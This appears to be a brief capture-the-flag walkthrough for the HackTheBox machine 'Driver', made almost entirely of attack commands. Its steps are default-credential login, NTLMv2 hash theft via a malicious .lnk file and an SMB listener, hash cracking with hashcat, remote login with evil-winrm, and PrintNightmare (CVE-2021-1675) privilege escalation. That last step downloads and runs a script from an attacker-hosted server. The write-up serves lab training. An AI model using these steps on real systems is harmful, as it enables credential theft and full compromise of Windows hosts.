# HACKTHEBOX Driver

Log into the web app with `admin:admin`
Create NTLMv2 hash theft files and upload `driver.lnk` to the web app.
```
$ ntlm-theft -g all -s 10.10.16.5 -f $PWD/driver
```

Start the SMB server with.
```
$ sudo smbserver.py leak /leak
```

Crack the ntlmv2 hash.
```
$ hashcat -a 0 -m 5600 hash.txt ~/Wordlists/rockyou.txt
```

Log in with evil-winrm.
```
$ evil-winrm -u tony -p liltony -i 10.10.11.106
```

Print nightmare privilege escalation with https://github.com/calebstewart/CVE-2021-1675
```
*Evil-WinRM* PS C:\Users\tony\Documents> iex(New-Object Net.WebClient).DownloadString('http://10.10.10.20:8000/CVE-2021-1675.ps1')
 *Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -DriverName "foo" -NewUser "tony" -NewPassword "liltony"
*Evil-WinRM* PS C:\Users\tony\Documents> exit
```

Log in again
```
$ evil-winrm -u tony -p liltony -i 10.10.11.106
```
